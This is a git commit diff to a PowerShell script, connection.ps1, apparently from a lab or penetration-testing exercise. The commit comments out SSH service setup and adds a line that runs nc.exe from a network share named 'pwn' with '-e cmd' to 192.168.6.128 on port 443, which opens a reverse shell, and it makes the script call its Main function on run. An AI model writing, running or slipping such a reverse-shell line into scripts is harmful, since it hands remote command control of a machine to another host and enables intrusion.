c0e97daa6527d84caa09575755374cbab5f20c23
AndresFelipeGualdron <gualdronsito@hotmail.com>
2022-04-09 21:58:08 -0500

    update script

--- connection.ps1
+++ connection.ps1
@@ -10,6 +10,10 @@ function Main
     ## Install the OpenSSH Server
     #Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 
-    Get-Service -Name *ssh* | Set-Service -StartupType Automatic;
-    Invoke-RestMethod -Uri 'http://192.168.0.3:8080'
+    #Get-Service -Name *ssh* | Set-Service -StartupType Automatic;
+    #Invoke-RestMethod -Uri 'http://192.168.0.3:8080'
+
+    cmd /c \\192.168.6.128\pwn\nc.exe -e cmd 192.168.6.128 443
 }
+
+Main
